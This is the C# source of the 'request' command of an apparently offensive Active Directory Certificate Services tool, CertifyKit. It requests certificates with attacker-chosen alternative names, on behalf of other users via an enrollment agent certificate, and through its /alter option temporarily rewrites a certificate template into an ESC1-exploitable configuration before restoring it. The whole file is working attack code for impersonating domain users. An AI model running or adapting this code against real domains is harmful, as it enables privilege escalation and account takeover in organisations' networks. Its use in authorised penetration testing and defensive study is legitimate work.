using System;
using System.Collections.Generic;
using CertifyKit.Lib;

namespace CertifyKit.Commands
{

    public class Request : ICommand
    {
        public static string CommandName => "request";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Request a Certificates");

            var CA = "";
            var subject = "";
            var altName = "";
            var template = "User";
            var machineContext = false;
            var install = false;
            var alter = false;

            if (arguments.ContainsKey("/ca"))
            {
                CA = arguments["/ca"];
                if (!CA.Contains("\\"))
                {
                    Console.WriteLine("[X] /ca format of SERVER\\CA-NAME required, you may need to specify \\\\ for escaping purposes");
                    return;
                }
            }
            else
            {
                Console.WriteLine("[X] A /ca:CA is required! (format SERVER\\CA-NAME)");
                return;
            }

            if (arguments.ContainsKey("/template"))
            {
                template = arguments["/template"];
            }

            if (arguments.ContainsKey("/subject"))
            {
                subject = arguments["/subject"];
            }

            if (arguments.ContainsKey("/altname"))
            {
                altName = arguments["/altname"];
            }

            if (arguments.ContainsKey("/install"))
            {
                install = true;
            }

            if (arguments.ContainsKey("/alter"))
            {
                alter = true;
            }

            if (arguments.ContainsKey("/computer") || arguments.ContainsKey("/machine"))
            {
                if (template == "User")
                {
                    template = "Machine";
                }
                machineContext = true;
            }

            LdapOperations ldapOperations = new LdapOperations();
            LdapOperations.TemplateDTO bkup = null;
            if (alter)
            {
                //edit cert template
                if (!arguments.ContainsKey("/template"))
                {
                    Console.WriteLine("\n[X] /template parameter missing. Alter template with caution!");
                    return;
                }
                
                LdapOperations.TemplateDTO esc1 = new LdapOperations.TemplateDTO
                {
                    mspkiEnrollmentFlag = new object[] { "0" }, //remove the need for additional approval set by the flag CT_FLAG_PEND_ALL_REQUESTS
                    mspkiCertificateNameFlag = new object[] { "1" }, //CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
                    mspkiCertificateApplicationPolicy = new object[] { "1.3.6.1.4.1.311.20.2.2", "1.3.6.1.5.5.7.3.2" }, //Smartcard logon, Client Authentication
                    pkiextendedkeyusage = new object[] { "1.3.6.1.4.1.311.20.2.2", "1.3.6.1.5.5.7.3.2" }, //Smartcard logon, Client Authentication
                    pkidefaultkeyspec = new object[] { "1" }
                };
                
                bkup = ldapOperations.AlterTemplate(template, esc1);
                Console.WriteLine($"\n[*] Certificate template '{template}' updated!");
            }

            if (arguments.ContainsKey("/onbehalfof"))
            {
                if (!arguments.ContainsKey("/enrollcert") || String.IsNullOrEmpty(arguments["/enrollcert"]))
                {
                    Console.WriteLine("[X] /enrollcert parameter missing. Issued Enrollment/Certificates Request Agent certificate required!");
                    return;
                }

                var enrollCertPassword = arguments.ContainsKey("/enrollcertpw")
                    ? arguments["/enrollcertpw"]
                    : "";

                if (!arguments["/onbehalfof"].Contains("\\"))
                {
                    Console.WriteLine("[X] /onbehalfof format of DOMAIN\\USER required, you may need to specify \\\\ for escaping purposes");
                    return;
                }

                Cert.RequestCertOnBehalf(CA, template, arguments["/onbehalfof"], arguments["/enrollcert"], enrollCertPassword, machineContext);
            }
            else
            {
                Cert.RequestCert(CA, machineContext, template, subject, altName, install);
            }

            if (alter)
            {
                //restore cert template
                ldapOperations.AlterTemplate(template, bkup);
                Console.WriteLine($"[*] Certificate template '{template}' restored!");
            }


        }
    }
}